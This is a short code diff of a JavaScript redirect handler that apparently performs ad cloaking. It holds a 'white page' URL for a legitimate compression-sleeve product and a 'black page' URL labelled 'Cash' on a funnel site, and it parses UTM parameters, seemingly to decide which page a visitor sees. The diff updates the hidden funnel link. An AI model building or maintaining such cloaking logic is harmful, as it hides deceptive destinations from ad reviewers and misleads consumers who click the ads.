@@ -2,7 +2,7 @@ export default function handler(req, res) {
     // URLs to redirect
     const whitePageURL = "https://jlgloveco.com/products/compression-arm-sleeve-james-lincoln-los-angeles";
     // Cash
-    const blackPageURL = "https://yabhewmyum.myfunnelish.com/imbassd-1735580529215666";
+    const blackPageURL = "https://yabhewmyum.myfunnelish.com/imbassd-1736192328243907";
   
     // Parse the UTM parameters from the request URL
     const queryParams = new URLSearchParams(req.url.split('?')[1]);
